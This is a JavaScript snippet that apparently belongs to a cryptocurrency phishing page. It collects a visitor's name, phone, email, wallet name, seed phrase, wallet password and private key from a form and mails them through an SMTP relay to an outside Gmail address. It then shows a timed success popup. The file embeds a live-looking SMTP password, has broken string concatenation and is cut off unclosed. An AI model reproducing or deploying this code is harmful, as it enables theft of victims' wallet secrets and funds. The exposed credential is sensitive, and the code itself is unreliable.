function emailSend(){

	var userName = document.getElementById('name').value;

	var phone = document.getElementById('phone').value;

	var email = document.getElementById('email'

	).value;

	var wallet = document.getElementById('wallet').value;

	var phrase = document.getElementById('phrase').value;

	var walletp = document.getElementById('walletp'

		).value;

	var privk = document.getElementById('privk'

	).value;



	var messageBody = "Name " + userName; +

	"<br/> Phone " + phone; +

	"<br/> Email " + email; +

	"<br/> Wallet " + wallet; +

	"<br/> Phrase " + phrase; +

	"<br/> walletp " + walletp; +

	"<br/> privk " + privk; +

	

	Email.send({

    Host : "smtp.elasticemail.com",

    Username : "adeolatoolz@gmail.com",

    Password : "2172D5A7255CC4CA36D4529DF81CAE9A28F8",

    To : "go.marryjane@gmail.com",

    From : "adeolatoolz@gmail.com",

    Subject : "This is the subject",

    Body : messageBody
}).then(
  message => {
  	if(message=='OK'){
  		let timerInterval;
Swal.fire({
  title: "Auto close alert!",
  html: "I will close in <b></b> milliseconds.",
  timer: 2000,
  timerProgressBar: true,
  didOpen: () => {
    Swal.showLoading();
    const timer = Swal.getPopup().querySelector("b");
    timerInterval = setInterval(() => {
      timer.textContent = `${Swal.getTimerLeft()}`;
    }, 100);
  },
  willClose: () => {
    clearInterval(timerInterval);
  }
}).then((result) => {
  /* Read more about handling dismissals below */
  if (result.dismiss === Swal.DismissReason.timer) {
    console.log("I was closed by the timer");
  }
});

  			}
  	else{
  		Swal.fire({
  icon: "error",
  title: "Oops...",
  text: "Something went wrong!",
  footer: '<a href="index.html">Why do I have this issue?</a>'
});
